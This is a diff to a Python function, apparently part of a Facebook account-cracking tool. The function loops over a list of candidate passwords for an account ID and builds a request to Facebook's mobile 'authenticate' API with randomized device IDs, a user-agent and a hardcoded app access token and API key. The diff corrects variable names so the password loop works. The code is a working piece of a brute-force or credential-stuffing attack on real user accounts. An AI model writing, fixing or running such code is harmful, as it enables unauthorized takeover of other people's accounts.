@@ -970,14 +970,11 @@ def m8(ids,pwv):
     warna = random.choice(my_color)
     try:
         for pas in pwv:
-            device_id = str(uuid.uuid4())
-            adid = str(uuid.uuid4())
-            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
-            info=  {'adid':str(uuid.uuid4()),
+            info= {'adid':str(uuid.uuid4()),
             'format':'json',
             'device_id':str(uuid.uuid4()),
-            'email':idf,
-            'password':pw,
+            'email':ids,
+            'password':pas,
             'generate_analytics_claims':'1',
             'community_id':'',
             'cpl':'true','try_num':'1',
@@ -994,7 +991,7 @@ def m8(ids,pwv):
             'fb_api_req_friendly_name':'authenticate',
             'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
             'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            update={'User-Agent': uax,
+            update={'User-Agent':uax,
             'Accept-Encoding':'gzip, deflate',
             'Connection':'close',
             'Content-Type':'application/x-www-form-urlencoded',
